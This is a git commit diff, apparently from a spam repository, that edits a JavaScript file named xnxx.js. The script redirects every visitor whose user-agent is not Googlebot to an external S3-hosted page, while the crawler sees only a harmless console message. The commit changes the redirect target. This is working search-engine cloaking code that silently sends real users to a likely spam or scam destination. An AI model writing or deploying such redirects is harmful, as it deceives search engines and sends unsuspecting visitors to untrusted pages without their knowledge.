f4184c063ab7e4a41b178804b6a094c44459a98b
adaralove <adara.love@aol.com>
2026-07-15 08:25:00 +0600

    Update xnxx.js

--- cst/video/xnxx.js
+++ cst/video/xnxx.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://sites.elastichq.org/?gist";
+  window.location.href = "https://lolpol.s3.amazonaws.com/video/index.html?gist";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
